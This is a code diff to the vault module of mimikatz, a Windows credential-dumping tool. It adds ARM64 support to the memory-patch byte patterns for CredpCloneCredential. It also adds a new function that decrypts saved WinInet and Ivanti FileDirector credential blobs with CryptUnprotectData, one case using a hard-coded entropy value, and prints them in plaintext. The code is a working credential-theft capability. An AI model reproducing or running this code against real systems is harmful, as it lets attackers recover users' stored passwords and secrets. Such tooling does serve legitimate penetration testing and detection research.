@@ -369,7 +369,7 @@ void kuhl_m_vault_list_descItemData(PVAULT_ITEM_DATA pData)
 	}
 }
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x47, 0x04, 0x83, 0xf8, 0x01, 0x0f, 0x84};
 BYTE PTRN_WN60_CredpCloneCredential[]			= {0x44, 0x8b, 0xea, 0x41, 0x83, 0xe5, 0x01, 0x75};
 BYTE PTRN_WN62_CredpCloneCredential[]			= {0x44, 0x8b, 0xfa, 0x41, 0x83, 0xe7, 0x01, 0x75};
@@ -392,7 +392,7 @@ KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
 	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_CredpCloneCredential),	PTRN_WN10_1803_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
 	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_CredpCloneCredential),	PTRN_WN10_1809_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{7}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x43, 0x04, 0x83, 0xf8, 0x01, 0x74};
 BYTE PTRN_WN60_CredpCloneCredential[]			= {0x89, 0x4d, 0x18, 0x83, 0x65, 0x18, 0x01, 0x75};
 BYTE PTRN_WN62_CredpCloneCredential[]			= {0x75, 0x1e, 0x83, 0x7f, 0x04, 0x02, 0x0f, 0x84};
@@ -472,9 +472,7 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 						);
 					kprintf(L"Credential : ");
 					kull_m_string_printSuspectUnicodeString(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize);
-					kprintf(L"\n"
-						L"Attributes : %u\n", pCredential[i]->AttributeCount
-						);
+					kprintf(L"\nAttributes : %u\n", pCredential[i]->AttributeCount);
 					if(kull_m_string_args_byName(argc, argv, L"attributes", NULL, NULL))
 					{
 						for(j = 0; j < pCredential[i]->AttributeCount; j++)
@@ -487,6 +485,7 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 							kprintf(L"\n");
 						}
 					}
+					kuhl_m_vault_cred_tryEncrypted(pCredential[i]);
 					kprintf(L"\n");
 				}
 				CredFree(pCredential);
@@ -495,4 +494,70 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
 	}
 	return STATUS_SUCCESS;
+}
+
+void kuhl_m_vault_cred_tryEncrypted(PCREDENTIAL pCredential)
+{
+	DATA_BLOB in, entropy, out;
+	PKULL_M_CRED_APPSENSE_DN pAppDN;
+	if(wcsstr(pCredential->TargetName, L"Microsoft_WinInet_"))
+	{
+		if(pCredential->CredentialBlobSize >= (DWORD) FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
+		{
+			if(RtlEqualGuid(pCredential->CredentialBlob + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER))
+			{
+				in.cbData = pCredential->CredentialBlobSize;
+				in.pbData = pCredential->CredentialBlob;
+				entropy.cbData = sizeof(KULL_M_CRED_ENTROPY_CRED_DER);
+				entropy.pbData = (PBYTE) KULL_M_CRED_ENTROPY_CRED_DER;
+				if(CryptUnprotectData(&in, NULL, &entropy, NULL, NULL, 0, &out))
+				{
+					kprintf(L"   CredentialBlob: ");
+					kull_m_string_printSuspectUnicodeString(out.pbData, out.cbData);
+					kprintf(L"\n");
+					LocalFree(out.pbData);
+				}
+				else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+			}
+		}
+	}
+	else if(wcsstr(pCredential->TargetName, L"AppSense_DataNow_"))
+	{
+		kprintf(L"* Ivanti FileDirector credential blob *\n");
+		if(pCredential->CredentialBlobSize >= (DWORD) FIELD_OFFSET(KULL_M_CRED_APPSENSE_DN, data))
+		{
+			pAppDN = (PKULL_M_CRED_APPSENSE_DN) pCredential->CredentialBlob;
+			if(!strcmp("AppN_DN_Win", pAppDN->type))
+			{
+				if(pAppDN->credBlobSize)
+				{
+					kprintf(L"Decrypting additional blob\n");
+					in.cbData = pAppDN->credBlobSize;
+					in.pbData = pAppDN->data;
+					if(CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
+					{
+						kprintf(L"   CredentialBlob: ");
+						kull_m_string_printSuspectUnicodeString(out.pbData, out.cbData);
+						kprintf(L"\n");
+						LocalFree(out.pbData);
+					}
+					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+				}
+				if(pAppDN->unkBlobSize)
+				{
+					kprintf(L"Decrypting additional blob\n");
+					in.cbData = pAppDN->unkBlobSize;
+					in.pbData = pAppDN->data + pAppDN->credBlobSize;
+					if(CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
+					{
+						kprintf(L"   UnkBlob       : ");
+						kull_m_string_printSuspectUnicodeString(out.pbData, out.cbData);
+						kprintf(L"\n");
+						LocalFree(out.pbData);
+					}
+					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
+				}
+			}
+		}
+	}
 }
